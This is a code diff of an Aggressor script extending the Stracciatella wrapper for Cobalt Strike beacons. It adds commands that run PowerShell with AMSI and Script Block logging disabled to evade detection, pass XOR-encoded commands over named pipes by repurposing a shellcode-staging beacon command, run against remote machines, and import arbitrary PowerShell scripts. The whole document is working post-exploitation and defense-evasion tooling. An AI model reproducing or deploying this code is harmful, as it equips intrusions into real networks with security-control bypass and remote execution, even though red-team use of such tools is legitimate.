@@ -1,22 +1,253 @@
 #
-# Stracciatella wrapper for Cobalt Strike 4.0+
+# Stracciatella wrapper for Cobalt Strike 4.0+. Capable of restoring previously set timeout value,
+# and importing again previously used scripts.
+#
+# Registers following commands:
+#   - stracciatella <command>
+#   - stracciatella-remote <command>
+#   - stracciatella-import <scriptpath>
+#   - stracciatella-clear
+#   - stracciatella-timeout <milliseconds>
 #
 # Author:
 #   Mariusz B. / mgeeky, '20
 #   (https://github.com/mgeeky)
 #
 
+global('$STRACCIATELLA_PATH %IMPORTED_SCRIPTS %IMPORTED_CMDLETS $STRACCIATELLA_PIPE_READ_TIMEOUT');
+
 $STRACCIATELLA_PATH = script_resource("stracciatella.exe");
+$STRACCIATELLA_PIPE_READ_TIMEOUT = 10 * 60 * 1000;
+
+%IMPORTED_SCRIPTS = %();
+%IMPORTED_CMDLETS = %();
 
 beacon_command_register(
     "stracciatella",
     "Runs mgeeky/Stracciatella Powershell runspace being even safer version of powerpick.",
-    "Use: stracciatella [-v] command\n\nDescription: Runs Stracciatella in a similar fashion to powerpick/powershell.\nIf '-v' is given, will result in verbose output from Stracciatella.\nThat will create a Powershell Runspace with Script Block logging and AMSI disabled for better OPSEC.");
+    "Use: stracciatella [-v] <command>\n\nDescription: Runs Stracciatella in a similar fashion to powerpick/powershell.\nIf '-v' is given, will result in verbose output from Stracciatella.\nThat will create a Powershell Runspace with Script Block logging and AMSI disabled for better OPSEC.");
+
+beacon_command_register(
+    "stracciatella-remote",
+    "Runs Stracciatella against a remote machine.",
+    "Use: stracciatella-remote [-v] <machine> <pipename> <command>\n\nDescription: Runs Stracciatella against a remote machine and a custom pipe name. '-v' is for verbose output.");
+
+beacon_command_register(
+    "stracciatella-import",
+    "Imports a powershell script that will be later used by Stracciatella commands.",
+    "Use: stracciatella-import <scriptpath>\n\nDescription: Imports a powershell script and extracts its cmdlets for later use with stracciatella commands.");
+
+beacon_command_register(
+    "stracciatella-clear",
+    "Clears stracciatella's imported script information.",
+    "Clears stracciatella's imported script information.");
+
+beacon_command_register(
+    "stracciatella-timeout",
+    "Sets timeout for named pipe read operation conducted by Stracciatella while awaiting for input script. Should be greater than Beacon's sleep parameter.",
+    "Use: stracciatella-timeout <milliseconds>\n\nDescription: Stracciatella will be spawned with a randomly generated pipe name. That named pipe will then be used by accompanying aggressor script to pass powershell commands to be executed by Stracciatella after it reads them from a pipe bound for listening. Since the write-pipe operation can be scheduled and executed after a round sleep-time delay, Stracciatella may be found long after closing its named pipe due to no input timeout. This command allows to configure the time Stracciatella should wait for incoming data on its named pipe for reading. This value should be around (SleepTime+25 seconds). ");
+
+
+sub writePipe {
+    local('$bid $machine $pipeName $data $pipe');
+
+    $bid = $1;
+    $machine = $2;
+    $pipeName = $3;
+    $data = $4;
+
+    $pipe = "\\\\" . $machine . "\\pipe\\" . $pipeName;
+
+    #
+    # CobaltStrike.jar:beacon.TaskBeacon.StagePipe():
+    #
+    # Command 57 originally used to stage xor-encoded shellcodes over pipe.
+    # Repurposed to constitute a stable writePipe primitive.
+    #
+    $builder = [new beacon.CommandBuilder];
+    [$builder setCommand: 57];
+    [$builder addLengthAndString: $pipe];
+    [$builder addString: $data];
+
+    #println("Writing " . strlen($data) . " bytes to " . $pipe);
+    call("beacons.task", $null, $bid, cast([$builder build], "b"));
+}
+
+sub readFile {
+    local('$path $content $f $message');
+    $path = $1;
+
+    try {
+        $f = openf($path);
+        $content = readb($f, -1);
+        if($content is $null) {
+            throw "Read empty file";
+        }
+        closef($f);
+        return $content;
+    }
+    catch $message { 
+        berror($1, "Could not read contents of file to upload. Error: $message");
+        return "";
+    }
+}
+
+# Based on beacon.TaskBeacon._extractFunctions():
+sub _extractFunctions {
+    local('$bid $data @cmdlets');
+    $bid = $1;
+    $data = $2;
+
+    @cmdlets = @();
+
+    while($data hasmatch "\\s*[fF]unction ([a-zA-Z0-9-]*).*?")
+    {
+        push(@cmdlets, matched()[0]);
+    }
+
+    %IMPORTED_CMDLETS[$bid] = @cmdlets;
+}
+
+sub isAttachingImportedScriptNeeded {
+    local('$bid $i $args $param @cmdlets');
+    $bid = $1;
+    $args = $2;
+    @cmdlets = @();
+
+    while($args hasmatch "\\s*([a-zA-Z0-9-]+)\\s*") {
+        push(@cmdlets, matched()[0]);
+    }
+
+    for($i = 0; $i < size(@cmdlets); $i++) {
+        if(@cmdlets[$i] in %IMPORTED_CMDLETS[$bid]) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
+sub stracciatellaRestoreSettings {
+    local('%entry %archives $bid $path $out');
+    %archives = data_query('archives');
+
+    if(size(%archives) == 0) {
+        return;
+    }
+    
+    foreach %entry (%archives) {
+        if (%entry['type'] ne "input") {
+            continue;
+        }
+
+        if(indexOf(%entry['data'], "stracciatella-timeout ", 0) == 0) {
+            if(%entry['data'] ismatch '^stracciatella-timeout (\d+)$') {
+                $STRACCIATELLA_PIPE_READ_TIMEOUT = matched()[0];
+            }
+        }
+        
+        if(indexOf(%entry['data'], "stracciatella-import ", 0) == 0) {
+            if(%entry['data'] ismatch '^stracciatella-import (.+)$') {
+                if(%entry['bid'] in beacon_ids()) {
+                    %IMPORTED_SCRIPTS[%entry['bid']] = matched()[0];
+                }
+            }
+        }
+    }
+
+    foreach $bid (keys(%IMPORTED_SCRIPTS)) {
+        $path = %IMPORTED_SCRIPTS[$bid];
+        $out = readFile($path);
+        
+        if(strlen($out) > 0) {
+            _extractFunctions($bid, $out);
+        }
+        else {
+            %IMPORTED_SCRIPTS[$bid] = "";
+            remove(%IMPORTED_SCRIPTS, $bid);
+        }
+    }
+}
+
+sub runStracciatella {
+    local('$bid $args $args0 $s $imported $cradle $scriptContents $opts $key $enc $verbose $pipename');
+    $bid = $1;
+    $verbose = $2;
+    $machine = $3;
+    $pipename = $4;
+    $args = $5;
+    $args0 = $args;
+
+    #println("Running stracciatella with verbose = ' $+ $verbose $+ ' ; machine = ' $+ $machine $+ ' ; pipename = ' $+ $pipename $+ ' ; command = ' $+ $args $+ '");
+
+    # generate the download cradle (if one exists) for an imported PowerShell script
+    $script = "";
+    $imported = 0;
+
+    if( ($1 in keys(%IMPORTED_SCRIPTS)) && (strlen(%IMPORTED_SCRIPTS[$1]) > 0)) {
+        if(isAttachingImportedScriptNeeded($1, $args) == 1) {
+            $script = %IMPORTED_SCRIPTS[$1];
+            $s = "; ";
+            $scriptContents = readFile($script);
+
+            if(strlen($scriptContents) > 0) {
+                if(right($scriptContents, 1) eq ";") { $s = " "; }
+                $args = powershell_compress($scriptContents) . $s . $args;
+                $imported = 1;
+            }
+        }
+    }
+
+    $key = rand(254) + 1;
+
+    $enc = base64_encode(str_xor($args, chr($key)));
+    $opts = "$verbose $+ -x $key -p $pipename -e -t $STRACCIATELLA_PIPE_READ_TIMEOUT";
+
+    if($imported == 0) {
+        btask($1, "Tasked Beacon to run Stracciatella: $args0", "T1093");
+    }
+    else {
+        btask($1, "Tasked Beacon to run Stracciatella with imported script: $args0", "T1093");
+    }
+
+    bexecute_assembly!($1, $STRACCIATELLA_PATH, $opts);
+    writePipe($1, ".", $pipename, $enc);
+}
+
+alias stracciatella-import {
+    local('$out');
+
+    $out = readFile($2);
+    if(strlen($out) > 0) {
+        %IMPORTED_SCRIPTS[$1] = $2;
+        _extractFunctions($1, $out);
+        btask($1, "Stracciatella imported ( $+ $2 $+ ) having " . size(%IMPORTED_CMDLETS[$1]) . " cmdlets.");
+    }
+}
+
+alias stracciatella-timeout {
+    if ('stracciatella-timeout *' iswm $0) {
+        $STRACCIATELLA_PIPE_READ_TIMEOUT = int(substr($0, strlen("stracciatella-timeout ")));
+    }
+    else {
+        berror($1, "Stracciatella's read-pipe timeout must be specified in milliseconds.");
+    }
+}
+
+alias stracciatella-clear {
+    if( $1 in keys(%IMPORTED_SCRIPTS)) {
+        %IMPORTED_SCRIPTS[$1] = "";
+        remove(%IMPORTED_SCRIPTS, $1);
+        %IMPORTED_CMDLETS[$1] = @();
+        remove(%IMPORTED_CMDLETS, $1);
+    }
+}
 
 alias stracciatella {
-    local('$args $s $args0 $cradle $opts $key $enc $verbose');
+    local('$args0 $args $verbose $pipename');
 
-    $args = substr($0, strlen("stracciatella "));
+    $args0 = substr($0, strlen("stracciatella "));
+    $args = $args0;
 
     $verbose = "";
     if ('stracciatella -v *' iswm $0) {
@@ -24,19 +255,40 @@ alias stracciatella {
         $args = substr($0, strlen("stracciatella -v "));
     }
 
-    # generate the download cradle (if one exists) for an imported PowerShell script
-    $cradle = beacon_host_imported_script($1);
-    $args0 = $args;
-    if(strlen($cradle) > 0) {
-        $s = "; ";
-        if(right($cradle, 1) eq ";") { $s = " "; }
-        $args = $cradle . $s . $args;
+    $pipename = [java.util.UUID randomUUID];
+    runStracciatella($1, $verbose, ".", $pipename, $args);
+}
+
+alias stracciatella-remote {
+    local('$args0 $args $verbose $pipename $machine $pos');
+
+    $args0 = substr($0, strlen("stracciatella-remote "));
+    $args = $args0;
+
+    $verbose = "";
+    if ('stracciatella-remote -v *' iswm $0) {
+        $verbose = "-v ";
+        $args = substr($0, strlen("stracciatella-remote -v "));
     }
 
-    $key = rand(254) + 1;
-    $enc = base64_encode(str_xor($args, chr($key)));
-    $opts = "$verbose $+ -x $key -e -c \" $+ $enc $+ \"";
+    $pos = indexOf($args, " ", 0);
+    if(($pos is $null) || (($pos + 1) > strlen($args))) {
+        berror($1, "Usage: stracciatella-remote [-v] <machine> <pipename> <command>\n\nNo machine specified!");
+        return;
+    }
 
-    btask($1, "Tasked Beacon to run Stracciatella: $args0", "T1093");
-    bexecute_assembly!($1, $STRACCIATELLA_PATH, $opts);
+    $machine = substr($args, 0, $pos);
+    $args = substr($args, $pos + 1);
+    $pos = indexOf($args, " ", 0);
+
+    if(($pos is $null) || (($pos + 1) > strlen($args))) {
+        berror($1, "Usage: stracciatella-remote [-v] <machine> <pipename> <command>\n\nNo pipename specified!");
+        return;
+    }
+
+    $pipename = substr($args, 0, $pos);
+    $args = substr($args, $pos + 1);
+    runStracciatella($1, $verbose, $machine, $pipename, $args);
 }
+
+stracciatellaRestoreSettings();
